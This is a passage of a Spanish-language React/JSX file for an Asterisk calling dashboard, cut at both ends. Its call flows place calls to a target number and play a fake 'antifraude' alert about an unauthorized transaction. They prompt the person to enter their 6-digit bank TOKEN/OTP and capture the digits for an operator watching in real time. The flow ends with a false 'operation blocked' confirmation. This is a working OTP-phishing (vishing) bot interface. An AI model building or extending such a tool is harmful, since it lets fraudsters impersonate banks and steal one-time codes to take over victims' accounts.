                  Advierte sobre una transacción no autorizada y le indica al cliente: <em>"Presione 1 para comunicarse con un asesor"</em>.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-sky-400/90 font-mono">
                  ✓ Timbra directo en Extensión {agentExtension} (X-Lite / MicroSIP)
                </div>
              </button>

              {/* Opción 4: Híbrido */}
              <button
                type="button"
                onClick={() => setCallFlowMode('hybrid')}
                className={`p-5 rounded-2xl border text-left transition-all relative ${
                  callFlowMode === 'hybrid'
                    ? 'bg-purple-500/15 border-purple-500 text-white shadow-xl shadow-purple-500/10 ring-2 ring-purple-500/60'
                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="p-2 rounded-xl bg-purple-500/20 text-purple-400">
                    <Radio className="w-5 h-5" />
                  </div>
                  {callFlowMode === 'hybrid' ? (
                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-purple-400 text-slate-950">
                      SELECCIONADO
                    </span>
                  ) : (
                    <span className="text-[10px] font-mono text-slate-500">Modo 4</span>
                  )}
                </div>
                <div className="text-sm font-bold text-white">4. Híbrido Completo (OTP + Asesor)</div>
                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
                  Pide el token de seguridad. Si el cliente ingresa el código se captura; si presiona 1 o solicita asesor, transfiere la llamada.
                </div>
                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-purple-400/90 font-mono">
                  ✓ Máxima flexibilidad operativa
                </div>
              </button>
            </div>
          </div>

          {/* Diagrama Visual del Flujo Paso a Paso */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
            <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-emerald-400" />
              <span>Diagrama del Flujo de Llamada ({callFlowMode.toUpperCase()})</span>
            </h4>

            <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 1</div>
                <div className="text-xs font-bold text-white mt-1">Conexión Saliente</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  Asterisk marca por la troncal <code className="text-slate-300">{activeCarrier}</code> mostrando el CallerID configurado.
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 2</div>
                <div className="text-xs font-bold text-white mt-1">Descolgado & Saludo</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  El cliente contesta. Asterisk ejecuta <code className="text-slate-300">Answer()</code> y reproduce la Alerta de <code className="text-emerald-300">{serviceLabel}</code>.
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/40 bg-emerald-950/20">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 3</div>
                <div className="text-xs font-bold text-white mt-1">
                  {callFlowMode === 'otp'
                    ? 'Solicitud de Token OTP'
                    : callFlowMode === 'press1'
                    ? 'Opción Press 1'
                    : callFlowMode === 'cancel_code'
                    ? 'Press-1 → Enviando Código'
                    : 'Menú Dual OTP/Asesor'}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  {callFlowMode === 'otp'
                    ? 'Asterisk lee los tonos DTMF (4 o 6 dígitos) y los almacena en AstDB.'
                    : callFlowMode === 'press1'
                    ? `Si presiona 1, ejecuta Dial(PJSIP/${agentExtension}) para conectar con tu softphone.`
                    : callFlowMode === 'cancel_code'
                    ? 'Si marca 1, reproduce "Un momento por favor, le estamos enviando un código de cancelación" y solicita los dígitos.'
                    : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 4</div>
                <div className="text-xs font-bold text-white mt-1">
                  {callFlowMode === 'press1'
                    ? 'Conversación en Vivo'
                    : callFlowMode === 'cancel_code'
                    ? 'Decisión Agente (Válido/Inválido)'
                    : 'Procesamiento OTP'}
                </div>
                <div className="text-[11px] text-slate-400 mt-1">
                  {callFlowMode === 'press1'
                    ? `El operador toma la llamada en el softphone registrado (Extensión ${agentExtension}).`
                    : callFlowMode === 'cancel_code'
                    ? 'El agente ve el código en tiempo real y presiona CÓDIGO VÁLIDO o CÓDIGO INVÁLIDO (si es inválido pide reintento).'
                    : 'Asterisk reproduce la locución de "Un momento validando su información".'}
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 5</div>
                <div className="text-xs font-bold text-white mt-1">Confirmación & Cierre</div>
                <div className="text-[11px] text-slate-400 mt-1">
                  {callFlowMode === 'cancel_code'
                    ? 'Si es Válido reproduce "Código validado, operación cancelada con éxito" y cierra la llamada.'
                    : 'Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.'}
                </div>
              </div>
            </div>
          </div>

          {/* Configuración Completa de Locuciones con Espacio Amplio */}
          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
              <div>
                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Volume2 className="w-5 h-5 text-emerald-400" />
                  <span>2. Locuciones y Audios Pregrabados ({serviceLabel})</span>
                </h4>
                <p className="text-xs text-slate-400">
                  Prueba, asigna o sube los audios que Asterisk reproducirá en cada etapa de la llamada.
                </p>
              </div>

              <button
                type="button"
                onClick={() => {
                  setQuickUploadSlot('introAudioPath');
                  setIsQuickUploadOpen(true);
                }}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto shadow-sm"
              >
                <Plus className="w-4 h-4" />
                <span>+ Subir o Grabar Nuevo Audio</span>
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                    <span>1. Saludo / Alerta Inicial Antifraude</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).introAudioPath, 'intro')}
                    disabled={!getServiceAudios(selectedService).introAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'intro' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        <span className="text-emerald-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={getServiceAudios(selectedService).introAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                  >
                    <option value="">-- Beep estándar de Asterisk --</option>
                    <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Predeterminado)</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={getServiceAudios(selectedService).introAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
                    placeholder="ej: custom/banrearreglado"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{getServiceAudios(selectedService).introAudioPath || 'beep'}.wav
                  </div>
                </div>
              </div>

              {/* Slot 2: Solicitud de Código OTP */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                    <span>2. Solicitud de Código OTP (DTMF)</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).promptAudioPath, 'prompt')}
                    disabled={!getServiceAudios(selectedService).promptAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'prompt' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        <span className="text-emerald-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={getServiceAudios(selectedService).promptAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                  >
                    <option value="">-- Beep estándar (espera dígitos) --</option>
                    <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
                    <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Digite su TOKEN de 6 dígitos")</option>
                    <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
                    <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={getServiceAudios(selectedService).promptAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
                    placeholder="ej: custom/solicitar_codigo_otp"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{getServiceAudios(selectedService).promptAudioPath || 'beep'}.wav
                  </div>
                </div>
              </div>

              {/* Slot 3: Transferencia Press-1 (Asesor) */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-sky-400"></span>
                    <span>3. Transferencia Press 1 (A Asesor / Ext 1001)</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).agentAudioPath, 'agent')}
                    disabled={!getServiceAudios(selectedService).agentAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'agent' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
                        <span className="text-sky-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={getServiceAudios(selectedService).agentAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
                  >
                    <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
                    <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo con un asesor...")</option>
                    <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={getServiceAudios(selectedService).agentAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
                    placeholder="ej: custom/conectar_asesor"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-sky-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Destino: Extensión <strong className="text-emerald-400">{agentExtension}</strong> (PJSIP)
                  </div>
                </div>
              </div>

              {/* Slot 4: Despedida / Éxito OTP */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-purple-400"></span>
                    <span>4. Confirmación / Éxito OTP Final</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).successAudioPath, 'success')}
                    disabled={!getServiceAudios(selectedService).successAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'success' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
                        <span className="text-purple-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={getServiceAudios(selectedService).successAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
                  >
                    <option value="">-- SayDigits (repite dígitos capturados) --</option>
                    <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
                    <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={getServiceAudios(selectedService).successAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
                    placeholder="ej: custom/operacion_bloqueada_exito"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-purple-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{getServiceAudios(selectedService).successAudioPath || 'SayDigits'}.wav
                  </div>
                </div>
              </div>

              {/* Slot 5: Audio al Marcar 1 - Enviando Código de Cancelación */}
              <div className="p-4 rounded-xl bg-slate-900 border border-amber-500/40 space-y-3 md:col-span-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-amber-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-amber-400"></span>
                    <span>5. Audio al Marcar 1: "Un momento por favor, le estamos enviando un código de cancelación"</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'cancel_wait')}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'cancel_wait' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-amber-400 animate-pulse" />
                        <span className="text-amber-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div className="space-y-1.5">
                    <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                    <select
                      value={getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'cancelCodeAudioPath', e.target.value)}
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-amber-500 font-mono"
                    >
                      <option value="custom/enviando_codigo_cancelacion">custom/enviando_codigo_cancelacion ("Un momento por favor, le estamos enviando un código...") [RECOMENDADO]</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                  </div>

                  <div className="space-y-1.5">
                    <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                    <input
                      type="text"
                      value={getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'cancelCodeAudioPath', e.target.value)}
                      placeholder="ej: custom/enviando_codigo_cancelacion"
                      className="w-full px-3 py-2 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-amber-500 focus:outline-none"
                    />
                  </div>
                </div>
                <div className="text-[10px] text-slate-400 font-mono">
                  Se reproduce inmediatamente al cliente marcar 1 en el <strong>Modo 4 (Press-1 + Código Cancelación)</strong>.
                </div>
              </div>

            </div>
          </div>

          {/* Configuración de Extensión de Softphone y Terminal VPS */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Parámetros de Operador */}
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <Settings2 className="w-4 h-4 text-emerald-400" />
                <span>3. Softphone Receptor</span>
              </h4>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">
                    Destino Asignado cuando el Cliente Presione 1 (Llamadas Individuales y Masivas)
                  </label>
                  {!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length === 1 ? (
                    <div className="p-3 rounded-xl bg-slate-900 border border-emerald-500/40 text-xs flex items-center justify-between">
                      <div>
                        <div className="font-mono font-bold text-emerald-400">Extensión {agentExtension} (Tu Softphone)</div>
                        <div className="text-[11px] text-slate-400 mt-0.5">
                          Tus llamadas individuales retornan exclusivamente a tu softphone asignado.
                        </div>
                      </div>
                      <UserCheck className="w-5 h-5 text-emerald-400 shrink-0" />
                    </div>
                  ) : (
                    <>
                      <select
                        id="select-ivr-action-agent"
                        value={agentExtension}
                        onChange={(e) => handleSelectAgentExtension(e.target.value)}
                        className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:border-emerald-500 focus:outline-none cursor-pointer"
                      >
                        <option value="ringall" className="text-purple-300 font-bold">
                          ⚡ Todas las Extensiones (Ring-All) - Timbran todas a la vez
                        </option>
                        {visibleAgentExtensions.map((ext) => (
                          <option key={ext.id} value={ext.extension}>
                            👤 Extensión {ext.extension} - {ext.name || `Agente ${ext.extension}`}
                          </option>
                        ))}
                      </select>
                      <div className="text-[11px] text-slate-400 mt-1">
                        {agentExtension === 'ringall' ? (
                          <span className="text-purple-300">
                            ⚡ <strong>Ring-All Habilitado:</strong> Cuando el cliente pulse 1, timbrarán a la vez todas las extensiones ({extensions.map((e) => e.extension).join(', ')}). Si la llamada la contesta la extensión <strong>1002</strong> y ésta transfiere al cliente al sistema automático (Ext. 4001+) para digitar su código, al validarse como aprobado la llamada <strong>retornará de forma exacta a la misma extensión 1002</strong>.
                          </span>
                        ) : (
                          <span>
                            🎯 <strong>Agente Específico:</strong> La llamada conectará directamente a la extensión <strong className="text-white font-mono">{agentExtension}</strong>. Si dicha extensión transfiere a la 4001+ para OTP, tras la validación retornará a la extensión {agentExtension}.
                          </span>
                        )}
                      </div>
                    </>
                  )}
                </div>

                <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 text-xs space-y-1">
                  <div className="text-slate-400 font-mono text-[10px]">Llamada de Prueba Interna</div>
                  <div className="text-slate-200">
                    Marca <code className="text-emerald-400 font-bold">8888</code> en tu softphone (1001) para escuchar y probar el IVR antes de lanzar llamadas a números externos.
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Barra de Lanzamiento Inmediato desde la Pestaña del IVR */}
          <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-950 via-slate-900 to-slate-950 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-xl bg-emerald-500/20 text-emerald-400">
                <Rocket className="w-5 h-5" />
              </div>
              <div>
                <div className="text-xs font-bold text-white">¿Listo para lanzar con este flujo de IVR?</div>
                <div className="text-[11px] text-slate-400">
                  Destino actual: <strong className="text-emerald-400 font-mono">{targetNumber || 'Sin número'}</strong> | Modo: <strong className="text-white uppercase">{callFlowMode}</strong>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2.5 w-full sm:w-auto">
              <button
                type="button"
                onClick={handleLaunchProductionCall}
                disabled={isLaunching || isHangingUp || !targetNumber.trim()}
                className="px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-slate-950 font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20 transition-all flex-1 sm:flex-initial cursor-pointer"
              >
                <PhoneCall className={`w-4 h-4 ${isLaunching ? 'animate-bounce' : ''}`} />
                <span>{isLaunching ? 'Lanzando...' : 'Lanzar Llamada'}</span>
              </button>
            </div>
          </div>
        </div>
      )}



      {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
      {isQuickUploadOpen && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <FileAudio className="w-5 h-5 text-emerald-400" />
                <h3 className="font-bold text-white text-sm">
                  Cargar Nueva Locución para la Campaña
                </h3>
              </div>
              <button
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="text-slate-400 hover:text-white p-1"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4">
              {/* Asignación de ranura */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Ranura en la campaña actual ({serviceLabel})
                </label>
                <select
                  value={quickUploadSlot}
                  onChange={(e) => setQuickUploadSlot(e.target.value as keyof CampaignAudioConfig)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white"
                >
                  <option value="introAudioPath">1. Saludo / Alerta Inicial</option>
                  <option value="promptAudioPath">2. Solicitud de Código OTP</option>
                  <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
                  <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
                  <option value="cancelCodeAudioPath">5. Enviando Código Cancelación (Press-1)</option>
                </select>
              </div>

              {/* Nombre de la locución */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Nombre descriptivo del audio
                </label>
                <input
                  type="text"
                  value={quickUploadName}
                  onChange={(e) => setQuickUploadName(e.target.value)}
                  placeholder="Ej: bienvenida_corporativa"
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white placeholder-slate-500 font-mono"
                />
              </div>

              {/* Opciones de carga: Archivo o Micrófono */}
              <div className="space-y-3 pt-1">
                <div className="text-xs font-semibold text-slate-300">Origen del audio:</div>

                {/* Subir archivo */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                    <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Seleccionar archivo (.wav, .mp3, .ogg)</span>
                  </div>
                  <input
                    type="file"
                    accept="audio/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        setQuickUploadFile(file);
                        if (!quickUploadName) {
                          setQuickUploadName(file.name.replace(/\.[^/.]+$/, ''));
                        }
                        const reader = new FileReader();
                        reader.onloadend = () => {
                          setQuickUploadDataUrl(reader.result as string);
                        };
                        reader.readAsDataURL(file);
                      }
                    }}
                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-emerald-300 hover:file:bg-slate-700 cursor-pointer"
                  />
                </div>

                {/* Grabar con micrófono */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                      <Mic className="w-3.5 h-3.5 text-rose-400" />
                      <span>Grabar locución con micrófono</span>
                    </div>
                    {isRecordingQuick && (
                      <span className="text-[10px] font-mono text-rose-400 font-bold animate-pulse">
                        ● Grabando ({quickRecordTime}s)
                      </span>
                    )}
                  </div>

                  {!isRecordingQuick ? (
                    <button
                      type="button"
                      onClick={handleStartRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 text-xs font-semibold flex items-center justify-center gap-2 border border-rose-500/30 transition-all"
                    >
                      <Mic className="w-3.5 h-3.5" />
                      <span>Iniciar Grabación de Voz</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={handleStopRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-rose-600/30"
                    >
                      <Square className="w-3.5 h-3.5 fill-current" />
                      <span>Detener y Procesar ({quickRecordTime}s)</span>
                    </button>
                  )}
                </div>

                {/* Previsualización del audio cargado */}
                {quickUploadDataUrl && (
                  <div className="p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between text-xs text-emerald-300">
                    <div className="flex items-center gap-2 truncate">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span className="truncate">Audio listo para procesar a Asterisk</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(quickUploadDataUrl, 'preview_quick')}
                      className="p-1 rounded bg-emerald-500/20 text-emerald-200 hover:text-white"
                      title="Escuchar"
                    >
                      <Play className="w-3.5 h-3.5" />
                    </button>
                  </div>
                )}
              </div>

              <div className="text-[11px] text-slate-500 font-mono bg-slate-950 p-2.5 rounded-lg border border-slate-800/80">
                ⚡ Asterisk optimiza automáticamente este archivo a <strong>PCM 8000Hz 16-bit Mono</strong> para la mejor fidelidad telefónica.
              </div>
            </div>

            <div className="flex items-center justify-end gap-3 pt-2 border-t border-slate-800">
              <button
                type="button"
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={handleSaveQuickAudio}
                disabled={!quickUploadDataUrl || !quickUploadName.trim()}
                className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
              >
                <Check className="w-4 h-4" />
                <span>Asignar a la Campaña</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal para Editar Guión / Entidad y Asignar sus 4 Audios Pregrabados */}
      {isEntityModalOpen && editingEntity && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-2xl overflow-hidden shadow-2xl space-y-4 my-8">
            {/* Header */}
            <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/60">
